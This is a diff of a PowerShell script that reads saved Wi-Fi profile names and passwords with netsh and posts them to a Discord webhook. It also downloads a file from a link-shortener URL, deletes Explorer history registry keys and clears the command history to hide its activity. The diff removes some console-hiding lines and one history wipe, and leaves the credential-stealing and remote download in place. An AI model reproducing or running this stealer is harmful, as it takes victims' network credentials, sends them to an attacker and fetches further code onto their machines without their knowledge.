@@ -45,7 +45,6 @@ $null = Start-Transcript -Path "$env:TEMP\Ain1_log.txt" -Append
 try {
     # Extract Wi-Fi profiles
     netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
-        [ConsoleWindow]::Hide()
         $wlan = $_.Matches.Value
         
         # Extract the Wi-Fi password
@@ -67,7 +66,6 @@ try {
 
         # Send the data to the Discord webhook
         try {
-            [ConsoleWindow]::Hide()
             Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue | Out-Null
         } catch {
             #Write-Host "Failed to send data to Discord webhook"
@@ -77,12 +75,8 @@ try {
     #Write-Host "An error occurred: $($_.Exception.Message)"
 }
 
-# Clear the PowerShell command history
-Clear-History
 
 ###############################################################################
-
-
 
 # Define the URL of the file to be downloaded
 $url = "https://lnkfwd.com/u/Kpj_Yric"  # Replace with your file URL
@@ -196,8 +190,6 @@ if (Test-Path $filePath) {
     #Write-Host "File not found: $filePath"
 }
 
-
-
 # End the transcript if you started one
 Stop-Transcript
 
@@ -213,6 +205,3 @@ reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\
 
 # Clear the PowerShell command history
 Clear-History
-
-# Exit the script
-exit
